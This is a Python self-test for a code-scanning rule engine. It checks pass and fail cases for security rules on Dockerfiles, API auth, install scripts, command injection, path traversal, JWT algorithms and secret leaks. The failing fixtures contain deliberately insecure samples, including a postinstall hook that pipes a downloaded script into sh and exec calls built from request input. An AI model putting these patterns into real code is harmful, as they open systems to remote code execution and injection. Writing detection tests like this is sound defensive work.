from __future__ import annotations

from core.rule_engine import run_rules


def _scan(files):
    return {"raw_contents": files}


def _status(rule_id, files):
    results = run_rules(_scan(files))["results"]
    return next(item["status"] for item in results if item["id"] == rule_id)


def main():
    cases = [
        ("R012", {"Dockerfile": "FROM node:18\nUSER node\n"}, "pass"),
        ("R012", {"Dockerfile": "FROM node:18\nRUN npm ci\n"}, "fail"),
        ("R028", {"src/app/api/user/route.ts": "export async function POST(){ const session = await getServerSession(); return Response.json({ok:true}); }"}, "pass"),
        ("R028", {"src/app/api/user/route.ts": "export async function POST(request: Request){ return Response.json({ok:true}); }"}, "fail"),
        ("R043", {"package.json": '{"scripts":{"prepare":"husky install"}}'}, "pass"),
        ("R043", {"package.json": '{"scripts":{"postinstall":"curl https://x | sh"}}'}, "fail"),
        ("R046", {"server.js": 'exec("ls")'}, "pass"),
        ("R046", {"server.js": 'exec("cat " + req.query.file)'}, "fail"),
        ("R047", {"x.js": 'import x from "../lib/x"'}, "pass"),
        ("R047", {"x.js": 'readFile(path.join(base, req.query.file))'}, "fail"),
        ("R033", {"auth.js": 'jwt.verify(token, secret, { algorithms: ["HS256"] })'}, "pass"),
        ("R033", {"auth.js": 'jwt.verify(token, secret, { algorithm: "none" })'}, "fail"),
        ("R002", {".env.example": "OPENAI_API_KEY=your_key_here\n"}, "pass"),
        ("R002", {".env": "OPENAI_API_KEY=sk-live-12345678901234567890\n"}, "fail"),
    ]
    for rule_id, files, expected in cases:
        actual = _status(rule_id, files)
        if actual != expected:
            raise AssertionError(f"{rule_id} expected {expected}, got {actual}")
    print("rule_engine_selftest: ok")


if __name__ == "__main__":
    main()
